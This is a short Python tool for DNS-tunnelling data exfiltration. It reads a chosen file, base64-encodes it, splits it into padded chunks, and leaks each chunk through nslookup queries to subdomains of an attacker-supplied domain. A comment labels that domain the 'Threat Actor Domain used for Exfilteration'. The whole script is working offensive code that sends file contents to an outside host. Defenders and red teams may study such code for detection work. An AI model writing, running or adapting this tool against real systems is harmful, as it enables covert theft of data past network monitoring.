import os, subprocess, time, base64, math
from random import randrange


##################
# Read from file #
##################

def ReadFrom(file):
	try:
		print('[+] Reading file.')
		with open(file, 'r') as r:
			return r.read()
	except FileNotFoundError:
		print(f'{file} was not found.')



# Get filname from user input
fileName = input('Filename: ')

#################
# Encoding Text #
#################

def Base64Encoder(text):
	sample_string_bytes = text.encode('ascii')
  
	base64_bytes = base64.b64encode(sample_string_bytes) 
	base64_string = base64_bytes.decode('ascii')

	print('[+] Base64 encoded.')
	return base64_string

##################
# Encrypt Text   #
##################

def getRandom(line):
	return randrange(len(line))

def Encryptor(text):
	string_from = 'abcdefghijkmnopqrstuvwxyz'
	rand_a = string_from[getRandom(text)]
	rand_b = string_from[getRandom(text)]
	rand_c = string_from[getRandom(text)]

	return rand_a + text + rand_b + rand_c



# Threat Actor Domain used for Exfilteration
DOMAIN_NAME = input('Domain Name:')

# place holder for Subdomains
holder_subdomain= []

# Reading complete text from text file as plain text
plain_text = ReadFrom(fileName)
if plain_text != None:
	encode_text = Base64Encoder(plain_text)

	# Approx. number of subdomains
	Subdomain_NUM = math.ceil(len(encode_text)/20)
	NUM = 0

	# Subdomain filtering
	while NUM < Subdomain_NUM:

		holder_subdomain.append(Encryptor(encode_text[0:20]))
		encode_text = encode_text[20::]
		NUM += 1

	full_text = ''
	xyz = 0
	input('Start transmitting... [PRESS ENTER KEY]')
	for subdomain in holder_subdomain:
		FQDN = subdomain + f'.{DOMAIN_NAME}'

		print(f"{xyz/len(holder_subdomain)*100:.1f} %", end="\r")

		ret = subprocess.call( ['nslookup', FQDN], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
		time.sleep(0.40)

		full_text += subdomain[1:-2]

		xyz += 1

print('Done.')
